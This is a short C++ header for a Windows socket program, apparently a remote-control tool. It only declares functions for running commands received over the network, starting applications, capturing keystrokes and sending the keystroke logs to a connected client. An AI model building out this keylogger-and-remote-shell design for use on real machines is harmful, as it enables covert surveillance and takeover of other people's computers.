#pragma once

#include <winsock2.h>
#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <functional>

#pragma comment(lib, "ws2_32.lib")  // Link thư viện Winsock

#define PORT 8080
#define BUFFER_SIZE 4096

using namespace std;

void runCommand(SOCKET clientSocket);

void startApplication(const std::string& command, SOCKET clientSocket);

void StartKeylogger(SOCKET clientSocket);

void SendLogToClient(SOCKET clientSocket);



